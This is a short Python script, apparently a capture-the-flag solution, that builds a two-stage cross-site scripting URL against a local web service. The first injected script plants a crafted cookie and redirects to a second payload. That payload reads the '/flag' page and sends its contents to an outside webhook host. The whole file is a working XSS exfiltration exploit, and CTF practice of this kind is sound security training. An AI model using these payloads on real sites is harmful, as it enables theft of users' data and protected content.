#!/usr/bin/env python3

def escape(html: str) -> str:
    return ''.join('%' + hex(ord(x))[2:].zfill(2) for x in html)

url = 'http://localhost:8989'
report = 'http://webhook.example/report'

step2 = f'''
<script>
    fetch('/flag')
        .then(x => x.text())
        .then(x => fetch('{report}?flag=' + encodeURIComponent(x)));
</script>
'''

step1 = f'''
<script>
    document.cookie = 'x="ss; Path=/xss';
    location.href = '/xss?xss={escape(step2)}';
</script>
'''

print(f'{url}/xss?xss={escape(step1)}')
